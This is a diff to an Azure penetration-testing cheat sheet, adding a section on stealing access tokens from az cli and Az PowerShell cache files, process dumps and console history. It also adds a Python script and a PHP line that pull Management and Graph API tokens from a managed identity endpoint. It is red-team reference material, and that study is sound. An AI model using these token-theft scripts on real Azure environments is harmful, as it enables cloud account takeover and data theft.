@@ -12,9 +12,9 @@
 * [Enumeration using Az powershell](#Enumeration-using-Az-powershell)
 * [Enumeration using Azure CLI](#Enumeration-using-Azure-CLI)
 * [Using Azure tokens](#Using-Azure-tokens)
+  * [Stealing tokens](#Stealing-tokens)
   * [Using tokes with CLI Tools - AZ PowerShell](#Using-tokes-with-CLI-Tools---AZ-PowerShell)
   * [Using tokes with CLI Tools - Azure CLI](#Using-tokes-with-CLI-Tools---Azure-CLI)
-  * [Stealing tokens](#Stealing-tokens)
   * [Using tokes with AzureAD module](#Using-tokes-with-AzureAD-module)
   * [Using tokens with API's - management](#Using-tokens-with-API's---management)
   * [Abusing tokens](#Abusing-tokens)
@@ -759,6 +759,58 @@ az storage account list
 - Both Az PowerShell and AzureAD modules allow the use of Access tokens for authentication.
 - Usually, tokens contain all the claims (including that for MFA and Conditional Access etc.) so they are useful in bypassing such security controls.
 
+### Stealing tokens
+#### Stealing tokens from az cli
+- az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
+- We can read tokens from the file, use them and request new ones too!
+- azureProfile.json in the same directory contains information about subscriptions. 
+- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
+- To clear the access tokens, always use az logout
+
+#### Stealing tokens from az powershell
+- Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```
+- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate. 
+- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
+- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
+- Always use Disconnect-AzAccount!!
+
+#### Request tokens from the CLI!
+- Check below for example in using tokens!
+
+### Stealing token scripts
+#### Python
+```
+import os
+import json
+
+IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+
+cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+
+val = os.popen(cmd).read()
+
+print("[+] Management API")
+print("Access Token: "+json.loads(val)["access_token"])
+print("ClientID: "+json.loads(val)["client_id"])
+
+cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+
+val = os.popen(cmd).read()
+print("\r\n[+] Graph API")
+print(json.loads(val)["access_token"])
+print("ClientID: "+json.loads(val)["client_id"])
+```
+
+#### PHP
+```
+<?php 
+
+system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+
+?>
+```
+
 ### Using tokes with CLI Tools - AZ PowerShell
 #### Request access token
 ```
@@ -804,20 +856,6 @@ Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
 ```
 az account get-access-token --resource-type ms-graph 
 ```
-
-### Stealing tokens from az cli
-- az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
-- We can read tokens from the file, use them and request new ones too!
-- azureProfile.json in the same directory contains information about subscriptions. 
-- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
-- To clear the access tokens, always use az logout
-
-### Stealing tokens from az powershell
-- Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```
-- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate. 
-- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
-- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
-- Always use Disconnect-AzAccount!!
 
 ### Using tokes with AzureAD module
 - AzureAD module cannot request a token but can use one for AADGraph or Microsoft Graph!
